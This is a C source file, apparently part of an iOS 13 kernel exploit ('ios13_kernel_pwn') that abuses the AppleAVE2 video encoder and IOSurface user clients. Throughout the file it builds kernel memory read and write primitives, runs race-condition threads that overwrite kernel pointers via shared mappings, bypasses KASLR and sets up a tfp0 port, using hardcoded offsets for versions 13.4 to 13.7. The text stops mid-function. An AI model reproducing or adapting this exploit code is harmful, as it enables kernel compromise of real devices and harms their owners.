//
//  ios13_kernel_universal.c
//  ios13_app1
//
//  Created by bb on 1/12/20.
//  Copyright © 2020 bb. All rights reserved.
//

// Update* For 13.4/13.4.1 Support
// Update* For 13.6/13.6.1 Support
// Update* For 13.7 Support

#include <stdio.h>
#include <setjmp.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/semaphore.h>
#include <mach/mach_traps.h>
#include <mach/thread_status.h>
#include <pthread/pthread.h>
#include <IOSurface/IOSurfaceRef.h>
#include <copyfile.h>
#include <dirent.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include "IOKitLib.h"
#include <mach-o/nlist.h>
#include <mach-o/getsect.h>

//Share analytics
extern bool share_analytics;

// HARDCODED addresses used in kernel
extern uint64_t HARDCODED_infoleak_addr;
extern uint64_t HARDCODED_allproc;
extern uint64_t HARDCODED_kernel_map;

// HARDCODED offsets used in kernel
extern uint32_t OFFSET_bsd_info_pid;
extern uint32_t OFFSET_bsd_info_task;
extern uint32_t OFFSET_task_itk_task_access;
extern uint32_t OFFSET_task_itk_registered;
extern uint32_t OFFSET_task_t_flags;

// HARDCODED zone index used in kernel
extern uint32_t zone_index_ipc_ports;
extern uint32_t zone_index_tasks;

extern void Apply_hardcoded_addresses_and_offsets(void);

jmp_buf reattempt_jmpb;

#define IO_BITS_PORT_INFO   0x0000f000
#define IO_BITS_KOTYPE      0x00000fff
#define IO_BITS_KOBJECT     0x00000800
#define IO_BITS_OTYPE       0x7fff0000
#define IO_BITS_ACTIVE      0x80000000

#define IKOT_NONE               0
#define IKOT_THREAD             1
#define IKOT_TASK               2
#define IKOT_HOST               3
#define IKOT_HOST_PRIV          4
#define IKOT_PROCESSOR          5
#define IKOT_PSET               6
#define IKOT_PSET_NAME          7
#define IKOT_TIMER              8
#define IKOT_PAGING_REQUEST     9
#define IKOT_MIG                10
#define IKOT_MEMORY_OBJECT      11
#define IKOT_XMM_PAGER          12
#define IKOT_XMM_KERNEL         13
#define IKOT_XMM_REPLY          14
#define IKOT_UND_REPLY          15
#define IKOT_HOST_NOTIFY        16
#define IKOT_HOST_SECURITY      17
#define IKOT_LEDGER             18
#define IKOT_MASTER_DEVICE      19
#define IKOT_TASK_NAME          20
#define IKOT_SUBSYSTEM          21
#define IKOT_IO_DONE_QUEUE      22
#define IKOT_SEMAPHORE          23
#define IKOT_LOCK_SET           24
#define IKOT_CLOCK              25
#define IKOT_CLOCK_CTRL         26
#define IKOT_IOKIT_SPARE        27
#define IKOT_NAMED_ENTRY        28
#define IKOT_IOKIT_CONNECT      29
#define IKOT_IOKIT_OBJECT       30
#define IKOT_UPL                31
#define IKOT_MEM_OBJ_CONTROL    32
#define IKOT_AU_SESSIONPORT     33
#define IKOT_FILEPORT           34
#define IKOT_LABELH             35
#define IKOT_TASK_RESUME        36

volatile struct ipc_port {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    // above stru members are pretty stable across versions, below is not, plz pay attenion to change
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
};

volatile struct task
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
        type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint32_t pad2;
    uint32_t pad3;
    uint64_t map;
};

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

extern void print_hexdump(void *buf, size_t len);
extern void Reply_notify_completion(void);
extern void Send_overwritting_iosurfaceMap(uint64_t remote_map_addr, uint64_t *local_map_addr);
extern void Send_notify_msg(void);
extern bool check_if_its_PAC_device(void);

pthread_attr_t pth_commAttr = {0};
void pth_commAttr_init(){
    pthread_attr_init(&pth_commAttr);
    pthread_attr_setdetachstate(&pth_commAttr, PTHREAD_CREATE_DETACHED);
}

bool check_num_stringlizability_4bytes(uint32_t input_num){
    char *stringlize = (char*)&input_num;
    if(stringlize[0] == '\0')
        return false;
    if(stringlize[1] == '\0')
        return false;
    return true;
}

void IOSurfaceRootUserClient_remove_surface_map(io_connect_t ioconn, uint32_t surfaceId){
    // Release the surface
    uint64_t input_sca = surfaceId;
    IOConnectCallScalarMethod(ioconn, 1, &input_sca, 1, NULL, NULL);
}

uint32_t IOSurfaceRootUserClient_create_surface_map(io_connect_t ioconn, uint64_t *remote_map_addr, uint32_t *remote_map_size){
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x4000000, //Need be equal or greater than 0x25BA8 ref: AVE ERROR: IOSurfaceBufferInitInfo->Size() bad
        0x0,
    };
    
    size_t output_stru_size = 0xDD0; // A fixed size
    char *output_stru = calloc(1, output_stru_size);
    int kr = IOConnectCallStructMethod(ioconn, 0, dict_create, sizeof(dict_create), output_stru, &output_stru_size);
    if(!kr){
        uint64_t ret_addr1 = *(uint64_t*)output_stru;
        //uint64_t ret_addr2 = *(uint64_t*)(output_stru + 8); // Read-only mapping from kernel
        //uint64_t ret_addr3 = *(uint64_t*)(output_stru + 0x10); // Read-only mapping from kernel
        // These are unused values here, you can deleted them.
        
        uint32_t ret_addr1_size = *(uint32_t*)(output_stru + 0x1C); // Must be uint32_t length here
        
        *remote_map_addr = ret_addr1;
        *remote_map_size = ret_addr1_size;
        
        return *(uint32_t*)(output_stru+0x18); //Output: Surface ID
    }
    return 0;
}

#pragma mark --- TFP0 Kernel Memory R/W Components ---

uint64_t kaslr = 0;
uint64_t kernel_map_kAddr = 0;
uint64_t ipc_space_kernel_kAddr = 0;
uint32_t tfp0_port = 0;
uint64_t tfp0_portStru = 0;
jmp_buf reattempt_jmpb;

uint32_t new_reading_primitive(uint64_t target_addr);
uint8_t KernelRead_1byte(uint64_t rAddr){
    if(tfp0_port){
        uint8_t retdata = 0;
        vm_size_t outsize = 0x1;
        vm_read_overwrite(tfp0_port, rAddr, 0x1, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return (uint8_t)new_reading_primitive(rAddr);
}

uint16_t KernelRead_2bytes(uint64_t rAddr){
    if(tfp0_port){
        uint16_t retdata = 0;
        vm_size_t outsize = 0x2;
        vm_read_overwrite(tfp0_port, rAddr, 0x2, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return (uint16_t)new_reading_primitive(rAddr);
}

uint32_t KernelRead_4bytes(uint64_t rAddr){
    if(tfp0_port){
        uint32_t retdata = 0;
        vm_size_t outsize = 0x4;
        vm_read_overwrite(tfp0_port, rAddr, 0x4, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    return new_reading_primitive(rAddr);
}

uint64_t KernelRead_8bytes(uint64_t rAddr){
    if(tfp0_port){
        uint64_t retdata = 0;
        vm_size_t outsize = 0x8;
        vm_read_overwrite(tfp0_port, rAddr, 0x8, (vm_address_t)&retdata, &outsize);
        return retdata;
    }
    uint32_t low_32bit = new_reading_primitive(rAddr);
    uint32_t high_32bit = new_reading_primitive(rAddr + 4);
    return (uint64_t)((((uint64_t)high_32bit) << 32) | low_32bit);
}

void KernelRead_anySize(uint64_t rAddr, char *outbuf, size_t outbuf_len){
    if(tfp0_port){
        vm_size_t outsize = outbuf_len;
        vm_read_overwrite(tfp0_port, rAddr, outbuf_len, (vm_address_t)outbuf, &outsize);
        return;
    }
    uint32_t aligned_outbuf_len = (uint32_t)outbuf_len;
    aligned_outbuf_len = (aligned_outbuf_len%4)?(((aligned_outbuf_len/4)+1)*4):aligned_outbuf_len;
    
    for(int i=0; i<aligned_outbuf_len; i=i+4){
        *(uint32_t*)(outbuf + i) = new_reading_primitive(rAddr + i);
    }
}

void new_writing_primi(uint64_t target_addr, uint32_t write_data);
void KernelWrite_1byte(uint64_t wAddr, uint8_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x1);
        return;
    }
    uint32_t read_data = KernelRead_4bytes(wAddr);
    *(uint8_t*)(&read_data) = wData;
    new_writing_primi(wAddr, read_data);
}

void KernelWrite_2bytes(uint64_t wAddr, uint16_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x2);
        return;
    }
    uint32_t read_data = KernelRead_4bytes(wAddr);
    *(uint16_t*)(&read_data) = wData;
    new_writing_primi(wAddr, read_data);
}

void KernelWrite_4bytes(uint64_t wAddr, uint32_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x4);
        return;
    }
    new_writing_primi(wAddr, wData);
}

void KernelWrite_8bytes(uint64_t wAddr, uint64_t wData){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)&wData, 0x8);
        return;
    }
    KernelWrite_4bytes(wAddr, (uint32_t)wData);
    KernelWrite_4bytes(wAddr + 4, (uint32_t)(wData >> 32));
}

void KernelWrite_anySize(uint64_t wAddr, char *inputbuf, uint32_t inputbuf_len){
    if(tfp0_port){
        vm_write(tfp0_port, wAddr, (vm_offset_t)inputbuf, inputbuf_len);
        return;
    }
    for(int i=0; i<inputbuf_len; i=i+4){
        new_writing_primi(wAddr + i, *(uint32_t*)(inputbuf + i));
    }
}

uint64_t KernelAllocate(size_t len){
    vm_address_t return_addr = 0;
    vm_allocate(tfp0_port, (vm_address_t*)&return_addr, len, VM_FLAGS_ANYWHERE);
    return return_addr;
}

void KernelDeallocate(uint64_t addr, size_t len){
    vm_deallocate(tfp0_port, addr, len);
}

uint32_t KernelUti_GenerateOffset(uint64_t src, uint64_t data_in_src){
    uint32_t returnVal = 0;
    while(1){
        uint64_t gg = KernelRead_8bytes(src);
        if(gg == data_in_src)
            return returnVal;
        returnVal += 4;
        src += 4;
    }
    return 0;
}

#pragma mark --- Kernel Exploitation Start ---

io_connect_t AppleAVE2UserClient_ioconn;
io_connect_t IOSurfaceRootUserClient_ioconn;

char *inputmap_InitInfo = NULL;
uint32_t InitInfo_surfaceId = 0;

uint32_t extra1_surfaceId = 0;
uint32_t extra2_surfaceId = 0;
uint32_t extraMany_surfaceID[20] = {0};

uint64_t input_shit = 0;
uint64_t kObject_AppleAVE2Driver = 0;
uint64_t kObject_IOSurface = 0;

uint64_t our_task_kAddr = 0;
uint64_t our_proc_kAddr = 0;

void kernel_exp_start(io_connect_t ave_ioconn, io_connect_t surface_ioconn){
    pth_commAttr_init();
    Apply_hardcoded_addresses_and_offsets();
    
    AppleAVE2UserClient_ioconn = ave_ioconn;
    IOSurfaceRootUserClient_ioconn = surface_ioconn;
    
    extern void ios13_kernel_pwn(io_connect_t ioconn, io_connect_t surface_ioconn);
    ios13_kernel_pwn(ave_ioconn, surface_ioconn);
}

void race_kmem2(){
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1072);
    uint32_t *action1 = (uint32_t*)(inputmap_InitInfo + 4);
    while(*alert1 == 0){}
    *action1 = 0;
}

uint64_t alloc_kernel_40_mem(){
    
    uint64_t user_iosurfaceinfo_buf;
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
    
    user_iosurfaceinfo_buf = *(uint64_t*)(inputmap_InitInfo + 5936);
    
    return user_iosurfaceinfo_buf;
}

void empty_kernel_40_mem(uint64_t target_addr){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
   
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
    *(uint64_t*)(inputmap_InitInfo + 5936) = target_addr;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
}

uint64_t alloc_kernel_40_mem_contains_iosurfacebuf(){
    
    uint64_t user_iosurfaceinfo_buf;
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
   
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0x333;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0x1; // this effect 40_mem_destroy, so must set back
    
    user_iosurfaceinfo_buf = *(uint64_t*)(inputmap_InitInfo + 5936);
    
    return user_iosurfaceinfo_buf;
}

void release_kernel_40_mem(uint64_t user_iosurfaceinfo_buf){
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
   
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5936) = user_iosurfaceinfo_buf;
    
    char *input_stru = calloc(1, 0x28);
    *(uint32_t*)(input_stru + 8) = 0;
    *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
    
    size_t output_stru_size = 0x4;
    char *output_stru = calloc(1, output_stru_size);
    
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    
    if(*(uint64_t*)(inputmap_InitInfo + 5936)){
        (printf)("release_kernel_40_mem failure detected....reattemping\n");
        longjmp(reattempt_jmpb, 1);
    }
}

void IOSurfaceRootUserClient_sRemoveValue(uint32_t spray_id, uint32_t key){
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = key;
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 11, input_stru, sizeof(input_stru), &output_stru, &output_stru_size);
}

char *www_output_stru = NULL;
char *IOSurfaceRootUserClient_sCopyValue(uint32_t spray_id, uint32_t lookup_key){
    
    uint32_t input_stru[3] = {0};
    input_stru[0] = spray_id;
    input_stru[1] = 0;
    input_stru[2] = lookup_key;
    
    size_t output_stru_size = 5000;
    if(!www_output_stru)
        www_output_stru = malloc(output_stru_size);
    bzero(www_output_stru, output_stru_size);
    
    int kr = IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 10, input_stru, sizeof(input_stru), www_output_stru, &output_stru_size);
    if(kr){
        printf("lookup_key: 0x%x IOSurfaceRootUserClient_sCopyValue failure: 0x%x\n", lookup_key, kr);
        return NULL;
    }
    
    return www_output_stru;
}

uint64_t magic_addr = 0;

uint64_t _temp_kernel_reading_mapOffset = 0x30000;
uint8_t _temp_kernel_reading_semaphore = 0;
uint64_t _temp_kernel_reading_target_addr = 0;

void _temp_kernel_reading_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 64;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

uint64_t temp_kernel_reading(uint64_t target_addr){
    
    int kr = 0;
    uint64_t retdata = 0;
    do{
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 0x10);
        if(*alert3){
            (printf)("alert3: 0x%llx\n", *alert3);
            retdata = *alert3;
            //break;
        }
        
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 0x8;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        //retdata = *(uint64_t*)(inputmap_InitInfo + 56);
        
    }while(!retdata || kr);
    
    
    return retdata;
}

void _temp_kernel_reading_categ3_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 64;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

uint32_t temp_kernel_reading_categ3(uint64_t target_addr){
    
    int kr = 0;
    uint32_t retdata = 0;
    do{
        //*(uint32_t*)(inputmap_InitInfo + 4) = 99;
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_categ3_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint32_t *alert3 = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 16);
        if(*alert3){
            //(printf)("temp_kernel_reading_bypass_kaslr: 0x%x\n", *alert3);
            retdata = *alert3;
            //break;
        }
        
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 16;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        //retdata = *(uint64_t*)(inputmap_InitInfo + 56);
        
    }while(!retdata || kr);
    
    //complete_frame(0); // mmm
    return retdata;
}

void _temp_kernel_reading_bypass_kaslr_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr - 24;
    uint64_t backup_iosurfacebuf = 0;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + 56);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    *alert2 = 0;//backup_iosurfacebuf;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

uint32_t temp_kernel_reading_categ5(uint64_t target_addr){
    
    int kr = 0;
    uint32_t retdata = 0;
    do{
        //*(uint32_t*)(inputmap_InitInfo + 4) = 99;
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_bypass_kaslr_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint32_t *alert3 = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 32);
        if(*alert3){
            //(printf)("temp_kernel_reading_bypass_kaslr: 0x%x\n", *alert3);
            retdata = *alert3;
        }
        
        _temp_kernel_reading_mapOffset = _temp_kernel_reading_mapOffset + 0x8;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
    }while(!retdata || kr);
    
    return retdata;
}

void temp_kernel_reading_insert_valid_kaddr(uint64_t target_addr){
    
    *(uint64_t*)(inputmap_InitInfo + 56) = 0;
    *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    *(uint32_t*)(inputmap_InitInfo + 96) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13477) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5936) = target_addr;
    {
        char input_stru[0x28] = {0};
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        uint32_t output_stru = 0;
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
    }
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

void _temp_kernel_reading_release_mem_threadFunc(){
    
    uint64_t precalc_value1 = magic_addr + _temp_kernel_reading_mapOffset; // input_shit
    uint64_t precalc_value2 = _temp_kernel_reading_target_addr;
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset); // input_shit->ptr
    uint64_t *alert3 = (uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 8);
    
    _temp_kernel_reading_semaphore = 1; // Ready
    
    while(!*alert1){if(!_temp_kernel_reading_semaphore) return;}
